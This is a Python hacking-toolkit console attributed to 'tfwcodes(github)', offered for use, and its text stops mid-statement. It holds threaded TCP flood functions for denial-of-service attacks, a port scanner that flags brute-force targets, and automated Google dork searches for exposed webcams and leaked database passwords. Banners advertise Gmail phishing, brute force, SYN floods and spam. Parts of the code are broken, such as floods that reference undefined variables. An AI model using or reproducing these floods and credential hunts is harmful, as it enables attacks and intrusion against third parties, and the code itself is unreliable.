
# All the imports I am gonna use
import socket
import threading
from tkinter.constants import E
import pyautogui
import ftplib
import smtplib
import requests
import colorama
import time
import os
import webbrowser
import ipaddress
import pygeoip
import tkinter as tk
import datetime
import sys
import subprocess
from cryptography.fernet import Fernet
from time import sleep
from queue import Queue
from playsound import playsound
from colorama import Fore, Back, Style
from scapy.all import *
from datetime import timedelta
from urllib.request import urlopen


colorama.init(autoreset=True)

def gethost():
    class getHost():
        host_ip = input(Fore.GREEN + "[+] Enter the domain[ex: google.com]: ")
        # Get the ip by the domain name 
        print(Fore.GREEN + "[!] The host is: " + socket.gethostbyname(host_ip))

def tcp_flood():
    class TcpFlood():
        def Tcp():
            while True:
                try:
                    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip3, port3))
                    s.send(data3.encode("utf-8"))
                except socket.error as e:
                    print(Fore.BLUE + str(e))
        threads = []
        for i in range(int(numbr_threads)):
            t = threading.Thread(target=Tcp)
            t.daemon = True
            threads.append(t)
        for i in range(int(numbr_threads)):
            threads[i].start()
        for i in range(int(numbr_threads)):
            threads[i].join()

def tcp_flood_1():
    class TcpFlood():
        def Tcp():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                    s.connect((ip3, port3))
                    s2.connect((ip3, port3))
                    s.send(data3.encode("utf-8"))
                except socket.error as e:
                    print(Fore.BLUE + str(e))
        threads = []
    
        for i in range(int(numbr_threads)):
            t = threading.Thread(target=Tcp)
            t.daemon = True
            threads.append(t)
        for i in range(int(numbr_threads)):
            threads[i].start()
        for i in range(int(numbr_threads)):
            threads[i].join()

def tcp_flood_3():
    class TcpFlood():
        def Tcp():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip3, port3))
                    s2.connect((ip3, port3))
                    s3.connect((ip3, port3))
                    s.send(data3.encode("utf-8"))
                except socket.error as e:
                    print(Fore.BLUE + str(e))
        threads = []
        for i in range(int(numbr_threads)):
            t = threading.Thread(target=Tcp)
            t.daemon = True
            threads.append(t)
        for i in range(int(numbr_threads)):
            threads[i].start()
        for i in range(int(numbr_threads)):
            threads[i].join()


def tcp_flood_4():
    class TcpFlood():
        def Tcp():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip3, port3))
                    s2.connect((ip3, port3))
                    s3.connect((ip3, port3))
                    s4.connect((ip3, port3))
                    s.send(data3.encode("utf-8"))
                except socket.error as e:
                    print(Fore.BLUE + str(e))
        threads = []
        for i in range(int(numbr_threads)):
            t = threading.Thread(target=Tcp)
            t.daemon = True
            threads.append(t)
        for i in range(int(numbr_threads)):
            threads[i].start()
        for i in range(int(numbr_threads)):
            threads[i].join()

def tcp_flood_5():
    class TcpFlood():
        def Tcp():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s5 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip3, port3))
                    s2.connect((ip3, port3))
                    s3.connect((ip3, port3))
                    s4.connect((ip3, port3))
                    s5.connect((ip3, port3))
                    s.send(data3.encode("utf-8"))
                except socket.error as e:
                    print(Fore.BLUE + str(e) )
        threads = []
        for i in range(int(numbr_threads)):
            t = threading.Thread(target=Tcp)
            t.daemon = True
            threads.append(t)
        for i in range(int(numbr_threads)):
            threads[i].start()
        for i in range(int(numbr_threads)):
            threads[i].join()
main_banner =             '''
             _____           _                  _
            |_   _|__   ___ | |___     _       / \   _ __  _ __  ___ 
              | |/ _ \ / _ \| / __|  _| |_    / _ \ | '_ \| '_ \/ __|
              | | (_) | (_) | \__ \ |_   _|  / ___ \| |_) | |_) \__ |  ~>Tools and Apps Console<~
              |_|\___/ \___/|_|___/   |_|   /_/   \_\ .__/| .__/|___/ ~~>Made by tfwcodes(github)<~~
                                                    |_|   |_|        ~~~>Version 1.0<~~~
            '''

banner1 =  '''

                          _                                       
         _ __   ___  _ __| |_ ___  ___ __ _ _ __  _ __   ___ _ __ 
        | '_ \ / _ \| '__| __/ __|/ __/ _` | '_ \| '_ \ / _ \ '__|
        | |_) | (_) | |  | |_\__ \ (_| (_| | | | | | | |  __/ |   ~>Portscanner app build in pytho
        | .__/ \___/|_|   \__|___/\___\__,_|_| |_|_| |_|\___|_|   ~~>Made by tfwcodes(github)<~~
        |_|                                                       

        '''

banner2 = '''
          _   _           _                                _          ___       
         | | | | ___  ___| |_ _ __   __ _ _ __ ___   ___  | |_ ___   |_ _|_ __  
         | |_| |/ _ \/ __| __| '_ \ / _` | '_ ` _ \ / _ \ | __/ _ \   | || '_ \ 
         |  _  | (_) \__ \ |_| | | | (_| | | | | | |  __/ | || (_) |  | || |_) |
         |_| |_|\___/|___/\__|_| |_|\__,_|_| |_| |_|\___|  \__\___/  |___| .__/  ~>Made by tfwcodes(github)<~
                                                                         |_|    ~~>Hostaname to Ip<~~                    

        '''

banner3 = '''
        
         _                    _   _               _____               _
        | |    ___   ___ __ _| |_(_) ___  _ __   |_   _| __ __ _  ___| | _____ _ __ 
        | |   / _ \ / __/ _` | __| |/ _ \| '_ \    | || '__/ _` |/ __| |/ / _ \ '__|
        | |__| (_) | (_| (_| | |_| | (_) | | | |   | || | | (_| | (__|   <  __/ |   ~>Location Tracker<~
        |_____\___/ \___\__,_|\__|_|\___/|_| |_|   |_||_|  \__,_|\___|_|\_\___|_|  ~~>Created by tfwcodse(github)<~~

        '''

banner4 = '''

         _   _                _             _____ _           _
        | | | | ___  __ _  __| | ___ _ __  |  ___(_)_ __   __| | ___ _ __ 
        | |_| |/ _ \/ _` |/ _` |/ _ \ '__| | |_  | | '_ \ / _` |/ _ \ '__|
        |  _  |  __/ (_| | (_| |  __/ |    |  _| | | | | | (_| |  __/ |   ~>Header Finder<~
        |_| |_|\___|\__,_|\__,_|\___|_|    |_|   |_|_| |_|\__,_|\___|_|   ~~>Made by tfwcodes(github)<~~


        '''

banner5 = '''
  ____                   _        ____             _    _
 / ___| ___   ___   __ _| | ___  |  _ \  ___  _ __| | _(_)_ __   __ _ 
|  |  _ / _ \ / _ \ / _` | |/ _ \ | | | |/ _ \| '__| |/ / | '_ \ / _` |
|  |_| | (_) | (_) | (_| | |  __/ | |_| | (_) | |  |   <| | | | | (_| |
 \____|\___/ \___/ \__, |_|\___| |____/ \___/|_|  |_|\_\_|_| |_|\__, |
                   |___/                                        |___/
 ____                      _
/ ___|  ___  __ _ _ __ ___| |__   ___ _ __                               ~>Google dorking searcher<~
\___ \ / _ \/ _` | '__/ __| '_ \ / _ \ '__|                             ~~>Made by tfwcodes(github)<~~
 ___) |  __/ (_| | | | (__| | | |  __/ |
|____/ \___|\__,_|_|  \___|_| |_|\___|_|

        '''


banner6 = '''

 __     __     _                      _           _
 \ \   / /   _| |_ __   ___ _ __ __ _| |__ (_) (_) |_ _   _ 
  \ \ / / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
   \ V /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
    \_/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, | ~>Vulnerability Searcher<~
                                                      |___/ ~~>Created by tfwcodes(github)<~~
  ____                      _
 / ___|  ___  __ _ _ __ ___| |__   ___ _ __ 
 \___ \ / _ \/ _` | '__/ __| '_ \ / _ \ '__|
  ___) |  __/ (_| | | | (__| | | |  __/ |
 |____/ \___|\__,_|_|  \___|_| |_|\___|_|

        '''

banner7 = '''
        __        ___  __ _                                             _ 
        \ \      / (_)/ _(_)  _ __   __ _ ___ _____      _____  _ __ __| |
         \ \ /\ / /| | |_| | | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
          \ V  V / | |  _| | | |_) | (_| \__ \__ \\ V  V / (_) | | | (_| |
           \_/\_/  |_|_| |_| | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~>Wifi Password Extracter<~
                             |_|                                          ~~>Made by tfwcodes(github)<~~  
                   _                  _
          _____  _| |_ _ __ __ _  ___| |_ ___ _ __  
         / _ \ \/ / __| '__/ _` |/ __| __/ _ \ '__| 
        |  __/>  <| |_| | | (_| | (__| ||  __/ |
         \___/_/\_|__ |_|  \__,_|\___|\__\___|_|

        '''

banner8 = '''

  __ _                                                     _ 
 / _| |_ _ __    _ __   __ _ ___ _____      _____  _ __ __| |
| |_| __| '_ \  | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
|  _| |_| |_) | | |_) | (_| \__ \__   V  V / (_) | | | (_|  | ~>Port 21(Ftp) bruteforce tool<~
|_|  \__| .__/  | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~~>Created by tfwcodes(github)<~~
        |_|     |_|

        '''

banner9 = '''
...
             ;::::;   ~>Bruteforce tool on gmail<~
           ;::::; :;  ~~>Made by tfwcodes(github)<~~
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#


        '''

banner10 = '''


 ____  _     _     _                ____                 _ _ 
|  _ \| |__ (_)___(_)_ __   __ _   / ___|_ __ ___   __ _(_) |
| |_) | '_ \| / __| | '_ \ / _` | | |  _| '_ ` _ \ / _` | | |
|  __/| | | | \__ \ | | | | (_| | | |_| | | | | | | (_| | | |  ~>Phishing gmail toolkit<~
|_|   |_| |_|_|___/_|_| |_|\__, |  \____|_| |_| |_|\__,_|_|_| ~~>Made by tfwcodes(github)<~~
                           |___/
 _____           _ _      _ 
|_   _|__   ___ | | | _(_) |_
  | |/ _ \ / _ \| | |/ / | __|
  | | (_) | (_) | |   <| | |_
  |_|\___/ \___/|_|_|\_\_|\__|
                        
        '''

banner11 = '''
        
        
          ____  ____       ____    __  __
         |  _ \|  _ \  ___/ ___|  |  \/  | ___ _ __  _   _ 
         | | | | | | |/ _ \___ \  | |\/| |/ _ \ '_ \| | | |
         | |_| | |_| | (_) |__) | | |  | |  __/ | | | |_| | ~>DDoS Menu<~
         |____/|____/ \___/____/  |_|  |_|\___|_| |_|\__,_|~~>Made by tfwcodes(github)<~~
        '''

banner12 = '''


                          __ _                 _ 
        _ __ ___  __ _   / _| | ___   ___   __| |
        | '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
        | | |  __/ (_| | |  _| | (_) | (_) | (_| |   ~>Request flooding app<~
        |_|  \___|\__, | |_| |_|\___/ \___/ \__,_|  ~~>Made by tfwcodes(github)<~~
                     |_|                          
        '''

banner12 = '''

         _   _     _         _____ _                 _ 
        | | | | __| |_ __   |  ___| | ___   ___   __| |
        | | | |/ _` | '_ \  | |_  | |/ _ \ / _ \ / _` |  ~>Udp Flood<~
        | |_| | (_| | |_) | |  _| | | (_) | (_) | (_| | ~~>Made by tfwcodes(github)<~~
         \___/ \__,_| .__/  |_|   |_|\___/ \___/ \__,_|
                    |_|

        '''

banner13 = '''


         _____            _____ _                 _ 
        |_   _|__ _ __   |  ___| | ___   ___   __| |
          | |/ __| '_ \  | |_  | |/ _ \ / _ \ / _` | ~>Tcp Flood Tool<~
          | | (__| |_) | |  _| | | (_) | (_) | (_| |~~>Made by tfwcodes(github)<~~
          |_|\___| .__/  |_|   |_|\___/ \___/ \__,_|
                '''

banner14 = '''

  ______   ___   _   _____ _                 _      _   _   _             _    
 / ___\ \ / / \ | | |  ___| | ___   ___   __| |    / \ | |_| |_ __ _  ___| |__
 \___ \  V /|  \| | | |_  | |/ _ \ / _ \ / _` |    / _ \| __| __/ _` |/ __| |/ 
  ___) || | | |\  | |  _| | | (_) | (_) | (_| |  / ___ \ |_| || (_| | (__|   <   ~>Syn Flood Attack<~
 |____/ |_| |_| \_| |_|   |_|\___/ \___/ \__,_| /_/   \_\__|\__\__,_|\___|_|\_  ~~>Made by tfwcodes(github)<~~


        '''

banner15 = '''


  _ __   __ _ ___ _____      _____  _ __ __| |
 | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
 | |_) | (_| \__ \__  V  V / (_) | | | (_|   |
 | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_|
 |_|
 ~>Simple password manager app<~
~~>Created By tfwcodes(github)<~~
  _ __ ___   __ _ _ __   __ _  __ _  ___ _ __
 | '_ ` _ \ / _` | '_ \ / _` |/ _` |/ _ \ '__|
 | | | | | | (_| | | | | (_| | (_| |  __/ |
 |_| |_| |_|\__,_|_| |_|\__,_|\__, |\___|_|
                              |___/

        '''


banner16 = '''


 _ __ ___   ___  __ _  __ _ ___ _ __   __ _ _ __ ___  
| '_ ` _ \ / _ \/ _` |/ _` / __| '_ \ / _` | '_ ` _ \ 
| | | | | |  __/ (_| | (_| \__ \ |_) | (_| | | | | | | ~>Made by tfwcodes(github)<~
|_| |_| |_|\___|\__, |\__,_|___/ .__/ \__,_|_| |_| |_| ~~>Spamming app)<~~ 
                      |___/    |_|
 
 
 

        '''
print(
    Fore.GREEN + 
    """
     _____           _                  _
    |_   _|__   ___ | |___     _       / \   _ __  _ __  ___ 
      | |/ _ \ / _ \| / __|  _| |_    / _ \ | '_ \| '_ \/ __|
      | | (_) | (_) | \__ \ |_   _|  / ___ \| |_) | |_) \__ |  ~>Tools and Apps Console<~
      |_|\___/ \___/|_|___/   |_|   /_/   \_\ .__/| .__/|___/ ~~>Made by tfwcodes(github)<~~
                                            |_|   |_|        ~~~>Version 1.3<~~~


    """
)

while True:
    try:
        # Menu  
        print("\n" + Fore.BLUE +  "{1} Information Gathering" +  "\n" + Fore.BLUE + "{2} Password Attacks" + "\n" +  Fore.BLUE + "{3} Sniffing" "\n" + Fore.BLUE + "{4} Web Hacking " + "\n" + Fore.BLUE +  "{5} Wireless Testing" + "\n" +  Fore.BLUE + "{6} other" + "\n")
        menu_help = input("[+] What do you want to access: ")
        if menu_help == "1":
            try:
                # Tool menu
                print("\n" + Fore.BLUE + "[01] Portscanner" + "\n" +  Fore.BLUE +"[02] Hostname to Ip addres lookup" + "\n" + Fore.BLUE + "[03] Location Tracker" + "\n" + Fore.BLUE + "[04] Header Finder" + "\n" + Fore.BLUE + "[05] Google Dorking Searcher" + "\n" + Fore.BLUE + "[06] Vulnerability Searcher" + "\n" + Fore.BLUE + "[07] Python Wifi Passowrd Extracter" +  "\n" + Fore.BLUE + "[08] Scan A Users server" + "\n"  + Fore.BLUE + "[09] Other Comands" + "\n")
                tool1 = input("[+] Enter what tool do you want to use: ")
                if tool1 == "01":
                    print(
                    Fore.GREEN + 
                    """
                                      _                                       
                     _ __   ___  _ __| |_ ___  ___ __ _ _ __  _ __   ___ _ __ 
                    | '_ \ / _ \| '__| __/ __|/ __/ _` | '_ \| '_ \ / _ \ '__|
                    | |_) | (_) | |  | |_\__ \ (_| (_| | | | | | | |  __/ |   ~>Portscanner app build in python<~
                    | .__/ \___/|_|   \__|___/\___\__,_|_| |_|_| |_|\___|_|   ~~>Made by tfwcodes(github)<~~
                    |_|                                                       
                    """)
                    while True:
                        try: 
                                print("\n" + "[!] Enter start_scan to start the portscanner" + "\n" + "[!] Enter scan_info to see how to start the scan" + "\n" + "[!] Enter cls to clear the screen" + "\n" + "[!] Enter Ctrl+C to exit the program" + "\n")
                                command = input("[+] Enter a command: ")
                                if command == "start_scan":
                                    ip = input(Fore.GREEN + "[+] Enter the ip/website you want to scan: ")
                                    number_of_threads = input("[+] Enter the number of threads: ")
                                    print(Fore.BLUE + "-------Trying-------")
                                    print(Fore.BLUE + "[!] The results will be saved in the file named prtresult.txt")
                                    print_lock = threading.Lock()
                                    list_ports = []

                                    def pscan(port):
                                        try:
                                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            con = sock.connect((ip, port))
                                            with print_lock:
                                                print(Fore.GREEN +"Port", port, "is open")
                                                list_ports.append(port)
                                            con.close()
                                        except:
                                            pass
                                        
                                        
                                    def threader():
                                        while True:
                                            worker = q.get()
                                            pscan(worker)
                                            q.task_done()


                                    q = Queue()

                                    for x in range(int(number_of_threads)):
                                        t = threading.Thread(target=threader)
                                        t.daemon = True
                                        t.start()

                                    for worker in range(1, 81):
                                        q.put(worker)

                                    q.join()
                                    file = open('prtresult.txt', 'w')
                                    file.write("The open ports are: " + str(list_ports))
                                    file.close()
                                if command == "scan_info":
                                    try:
                                        print(
                                            Fore.BLUE + "If you want to scan a website ex [http://www.example.com/] you need to enter only the domain (example.com) not the whole name")
                                    except KeyboardInterrupt:
                                        exit()
                                if command == "cls":
                                    try:
                                        os.system("cls")
                                    except:
                                        os.system("clear")
                        except KeyboardInterrupt:
                            exit()
                if tool1 == "02":
                    try:
                        print(
                        Fore.GREEN + 
                        """
                         _   _           _                                _          ___       
                        | | | | ___  ___| |_ _ __   __ _ _ __ ___   ___  | |_ ___   |_ _|_ __  
                        | |_| |/ _ \/ __| __| '_ \ / _` | '_ ` _ \ / _ \ | __/ _ \   | || '_ \ 
                        |  _  | (_) \__ \ |_| | | | (_| | | | | | |  __/ | || (_) |  | || |_) |
                        |_| |_|\___/|___/\__|_| |_|\__,_|_| |_| |_|\___|  \__\___/  |___| .__/  ~>Made by tfwcodes(github)<~
                                                                                        |_|    ~~>Hostaname to Ip<~~                                           
                        """    
                        )
                        while True:
                            # Help menu
                            print("\n" + Fore.BLUE + "[!] Enter get_host to get the host by the domain name" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE +  "[!] Enter Ctrl+C to exit" + "\n")
                            qst = input("[+]Enter a command: ")
                            if qst == "get_host":
                                try:
                                    gethost()
                                except KeyboardInterrupt:
                                    exit()
                            if qst == "cls":
                                try:
                                    # Clear the screen
                                    os.system('cls')
                                except:
                                    os.system("clear")   
                    except KeyboardInterrupt:
                        exit()
                if tool1 == "03":
                    try:
                        print(
                            Fore.GREEN +
                            """
                             _                    _   _               _____               _
                            | |    ___   ___ __ _| |_(_) ___  _ __   |_   _| __ __ _  ___| | _____ _ __ 
                            | |   / _ \ / __/ _` | __| |/ _ \| '_ \    | || '__/ _` |/ __| |/ / _ \ '__|
                            | |__| (_) | (_| (_| | |_| | (_) | | | |   | || | | (_| | (__|   <  __/ |   ~>Location Tracker<~
                            |_____\___/ \___\__,_|\__|_|\___/|_| |_|   |_||_|  \__,_|\___|_|\_\___|_|  ~~>Created by tfwcodse(github)<~~


                            """
                        )
                        while True:
                            print(Fore.BLUE + "[!] If you want to see the addres you must have the file named GeoLiteCity.dat installed")
                            target = input(Fore.GREEN + "[+] Enter the Ipv4 address: ")
                            opd1 = input(Fore.GREEN + "[+] Enter the path of GeoLiteCity.dat: ")
                            gip  = pygeoip.GeoIP(opd1)
                            res  = gip.record_by_addr(target)  
                            for key, val in res.items():
                                print('%s : %s' % (key, val))
                    except KeyboardInterrupt:
                        exit()
                if tool1 == "04":
                    try:
                        print(
                            Fore.GREEN + 
                            """
                             _   _                _             _____ _           _
                            | | | | ___  __ _  __| | ___ _ __  |  ___(_)_ __   __| | ___ _ __ 
                            | |_| |/ _ \/ _` |/ _` |/ _ \ '__| | |_  | | '_ \ / _` |/ _ \ '__|
                            |  _  |  __/ (_| | (_| |  __/ |    |  _| | | | | | (_| |  __/ |   ~>Header Finder<~
                            |_| |_|\___|\__,_|\__,_|\___|_|    |_|   |_|_| |_|\__,_|\___|_|   ~~>Made by tfwcodes(github)<~~

                            """
                        )
                        while True:
                            url_header = input(Fore.GREEN + "[+] Enter the url: ")
                            r = requests.get(url_header)
                            print(Fore.BLUE + str(r.headers))
                    except KeyboardInterrupt:
                        exit()

                if tool1 == "05":
                    print(
                        Fore.GREEN + 
                        """
                         ____                   _        ____             _    _
                        / ___| ___   ___   __ _| | ___  |  _ \  ___  _ __| | _(_)_ __   __ _ 
                         |  _ / _ \ / _ \ / _` | |/ _ \ | | | |/ _ \| '__| |/ / | '_ \ / _` |
                         |_| | (_) | (_) | (_| | |  __/ | |_| | (_) | |  |   <| | | | | (_| |
                        \____|\___/ \___/ \__, |_|\___| |____/ \___/|_|  |_|\_\_|_| |_|\__, |
                                          |___/                                        |___/
                        ____                      _
                       / ___|  ___  __ _ _ __ ___| |__   ___ _ __                               ~>Google dorking searcher<~
                       \___ \ / _ \/ _` | '__/ __| '_ \ / _ \ '__|                             ~~>Made by tfwcodes(github)<~~
                        ___) |  __/ (_| | | | (__| | | |  __/ |
                       |____/ \___|\__,_|_|  \___|_| |_|\___|_|



                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE +  "[!] Enter start_search to start searching for vulnerabilities" + "\n" + Fore.BLUE + "[!] Enter Ctrl+C to exit the app" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                            srv = input("[+] Enter a command: ")
                            if srv == "start_search":
                                opd = input("[+] Enter the path of google chrome.exe (it may be C:\Program Files\Google\Chrome\Application\chrome.exe): ")
                                while True:
                                    try:
                                        print(Fore.BLUE + "[!!!] When google is gonna pop up you need to click fast on the search bar otherwhise the app is not gonna have any effect ")
                                        print("\n" + Fore.BLUE +  "[a] Web cameras" + "\n" + Fore.BLUE + "[b] Ip's that may be vulnerable" + "\n" + Fore.BLUE + "[c] Datebase passwords" + "\n" + Fore.BLUE + "[d] Registery files" + "\n" + Fore.BLUE + "[e] Log files" + "\n" + Fore.BLUE + "[f] Sql injection Vulnerability" + "\n")
                                        z = input(Fore.GREEN + "[+] For what to do you want to search: ")
                                        if z == "a":
                                            try:
                                                url1 = 'inurl:php?id='

                                                chrome_path = opd

                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(chrome_path))
                                                webbrowser.get("chrome").open_new_tab(url1)

                                                sleep(6)
                                                pyautogui.write("intitle: 'webcamxp 5'")
                                                pyautogui.press("enter")

                                            except KeyboardInterrupt:
                                                exit()

                                        if z == "b":
                                            try:
                                                url1 = 'inurl:php?id='

                                                path_chome = opd
                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(path_chome))
                                                webbrowser.get("chrome").open_new_tab(url1)

                                                sleep(6)
                                                pyautogui.write("intitle:'Nessus Scan Report' 'This file was generated by Nessus'")
                                                pyautogui.press("enter")
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "c":
                                            try:
                                                url1 = 'inurl:php?id='
                                                chrome_pth = opd
                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(chrome_pth))
                                                webbrowser.get("chrome").open_new_tab(url1)

                                                sleep(6)
                                                pyautogui.write("filetype:env 'DB_PASSWORD'")
                                                pyautogui.press("enter")
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "d":
                                            try:
                                                url1 = 'inurl:php?id='
                                                path_chomee = opd
                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(path_chomee))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                                pyautogui.write("filetype:reg reg HKEY_CURRENT_USER username")
                                                pyautogui.press("enter")
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "e":
                                            try:
                                                url1 = 'inurl:php?id='
                                                path_chomer = opd
                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(path_chomer))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                                pyautogui.write("filetype:reg reg HKEY_CURRENT_USER username")
                                                pyautogui.press("enter")

                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "f":
                                            try:
                                                url1 = 'inurl:php?id='
                                                path_chomere = opd
                                                webbrowser.register("chrome", None ,webbrowser.BackgroundBrowser(path_chomere)) 
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                                pyautogui.write("inurl:php?id=")
                                                pyautogui.press("enter")
                                            except KeyboardInterrupt:
                                                exit()
                                        if z == "cls":
                                            try:
                                                os.system('cls')
                                            except:
                                                os.system('clear')
                                    except KeyboardInterrupt:
                                        exit()
                            if srv == "cls":
                                try:
                                    os.system('cls')
                                except:
                                    os.system('clear')
                        except KeyboardInterrupt:
                            exit()
                if tool1 == "09":
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter github_finder to see if an username exists on github"+ "\n"  + Fore.BLUE +  "[!] Enter my_ip to see what's  my ip" + "\n" + Fore.BLUE +  "[!] Enter my_mac to see your mac addres" + "\n" +  Fore.BLUE + "[!] Enter wlan0_start to start wlan0 (requires kali linux/ parrot os security)" + "\n" +  Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                            commnd = input("[+] Enter a command: ")
                            if commnd == "github_finder":
                                try:
                                    usrnm = input(Fore.GREEN + "[+] Enter a username: ")
                                    url4 = f'https://github.com/{usrnm}'
                                    print(Fore.GREEN + "-----Trying-----")

                                    s = requests.session()

                                    r = s.get(url4)
                                    if r.status_code == 200:
                                        print(Fore.GREEN + "[!] Username found: ",usrnm)
                                    if r.status_code == 404:
                                        print(Fore.GREEN + "[-] The username doesn't exists")
                                except KeyboardInterrupt:
                                    exit()
                            if commnd == "my_ip":
                                try:
                                    hostname = socket.gethostname()
                                    myip = socket.gethostbyname(hostname)
                                    print(Fore.GREEN + "[~] My ip is: ", myip)
                                except KeyboardInterrupt:
                                    exit()
                            if commnd == "my_mac":
                                try:
                                    # Write with os the command getmac to get the mac addres
                                    os.system('getmac')
                                except:
                                    # If the user uses Linux/Mac it will write the command the ifconfig and the mac addres will be the  physical addres
                                    os.system('ifconfig')
                            if commnd == "wlan0_start":
                                try:
                                    # Start with airmon-ng wlan0
                                    os.system('sudo airmon-ng start wlan0')
                                except:
                                    # If the user uses Windows/Mac it will print that he doesnt run kali linux/parrot os security    
                                    print(Fore.GREEN + "[!] You dont run kali linux/ parrot os security")
                            if commnd == "cls":
                                try:
                                    os.system('cls')
                                except:
                                    os.system("clear")
                        except KeyboardInterrupt:
                            exit()

                if tool1 == "06":
                    print(
                        Fore.GREEN + 
                        """
                        __     __     _                      _           _
                        \ \   / /   _| |_ __   ___ _ __ __ _| |__ (_) (_) |_ _   _ 
                         \ \ / / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
                          \ V /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
                           \_/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, | ~>Vulnerability Searcher<~
                                                                             |___/ ~~>Created by tfwcodes(github)<~~
                         ____                      _
                        / ___|  ___  __ _ _ __ ___| |__   ___ _ __ 
                        \___ \ / _ \/ _` | '__/ __| '_ \ / _ \ '__|
                         ___) |  __/ (_| | | | (__| | | |  __/ |
                        |____/ \___|\__,_|_|  \___|_| |_|\___|_|



                        """
                    )
                    while True:
                        print("\n" + Fore.BLUE + "[!] Enter start_search to start searching for vulnerabilities " + "\n" + Fore.BLUE +  "[!] Enter search_info to see info about the tool (you migh wanna see this if you neved tested the app)" + "\n" + Fore.BLUE +  "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE +  "[!] Enter Ctrl+C to exit the app" + "\n")
                        comman = input("[+] Enter a command: ")
                        if comman == "start_search":
                            try:
                                ip = input(Fore.GREEN + "[+] Enter the ip/website you want to scan: ")
                                number_of_threads = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                b = input(Fore.GREEN + "[+] Is the target a pc or a web server [1/2]: ")
                                if b == "1": 
                                    try:
                                        z = input(Fore.GREEN + "[+] Enter the mode: ")
                                        print(Fore.GREEN + "-------Trying-------")
                                        if z == "1":
                                            
                                                print_lock = threading.Lock()
                                                list_of_vuln = []
                                                def pscan(port):
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                        con = sock.connect((ip, port))
                                                        with print_lock:
                                                            print(Fore.GREEN + "Port", port, "is open")
                                                            list_of_vuln.append(port)
                                                            try:
                                                                if port == 21:
                                                                    try:
                                                                        print(Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                                    except KeyboardInterrupt:
                                                                        exit()
                                                                if port == 22:
                                                                    try:
                                                                        print(Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                                    except KeyboardInterrupt:
                                                                        exit()
                                                            except KeyboardInterrupt:
                                                                exit()
                                                        con.close()
                                                    except:
                                                        pass
                                                    
                                                    
                                                def threader():
                                                    while True:
                                                        worker = q.get()
                                                        pscan(worker)
                                                        q.task_done()
                                                q = Queue()
                                                for x in range(int(number_of_threads)):
                                                    t = threading.Thread(target=threader)
                                                    t.daemon = True
                                                    t.start()
                                                for worker in range(1, 23):
                                                    q.put(worker)
                                                q.join()
                                                file5 = open("vuln.txt", 'w')
